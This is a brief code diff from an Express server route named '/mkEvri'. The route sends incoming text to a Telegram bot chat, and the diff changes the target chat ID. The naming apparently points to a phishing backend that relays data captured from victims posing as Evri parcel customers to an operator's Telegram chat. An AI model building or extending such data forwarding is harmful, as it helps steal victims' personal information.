@@ -13300,7 +13300,7 @@ app.post("/mkEvri", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: "-443819992",
+              chat_id: 729640669,
               text: `Evri:\n${originalText}`,
               parse_mode: "Markdown",
             }
